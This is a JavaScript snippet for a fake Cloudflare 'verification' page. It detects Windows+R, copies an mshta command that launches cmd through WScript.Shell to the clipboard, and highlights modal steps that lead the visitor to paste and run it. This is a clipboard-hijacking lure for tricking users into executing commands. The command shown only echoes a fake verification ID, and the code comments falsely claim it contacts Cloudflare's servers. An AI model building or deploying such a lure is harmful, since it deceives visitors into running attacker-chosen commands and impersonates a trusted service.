document.addEventListener("DOMContentLoaded", function() {
  // Listen for Windows+R key combination
  let winKeyPressed = false;
  
  document.addEventListener("keydown", function(event) {
    // Windows key has no standard keyCode, so we use common values
    // MetaKey (⌘ on Mac) is often used as a substitute in testing
    if (event.key === "Meta" || event.keyCode === 91 || event.keyCode === 92) {
      winKeyPressed = true;
    }
    
    // If Windows+R is pressed
    if (winKeyPressed && (event.key === "r" || event.keyCode === 82)) {
      // Generate mshta command for clipboard
      const mshtaCommand = generateMshtaCommand();
      
      // Copy to clipboard
      navigator.clipboard.writeText(mshtaCommand)
        .then(() => {
          console.log("mshta command copied to clipboard");
          // Update UI to show next step
          document.querySelector("#verification-modal ol li:first-child").style.color = "#4CAF50";
          document.querySelector("#verification-modal ol li:nth-child(2)").style.fontWeight = "bold";
        })
        .catch(err => {
          console.error("Could not copy text: ", err);
        });
    }
  });
  
  document.addEventListener("keyup", function(event) {
    if (event.key === "Meta" || event.keyCode === 91 || event.keyCode === 92) {
      winKeyPressed = false;
    }
  });
  
  // Generate the verification command
  function generateMshtaCommand() {
    const sessionId = "91923b78ba53249b";
    const timestamp = Date.now();
    const verificationCode = "91923b";
    
    // This is a placeholder - the actual command would be more complex
    // and would communicate with Cloudflare's verification servers
    return `mshta javascript:eval('var r=new ActiveXObject("WScript.Shell").Run("cmd /c echo Cloudflare Verification &echo ID: ${verificationCode} &pause",1,true);window.close()');`;
  }
});
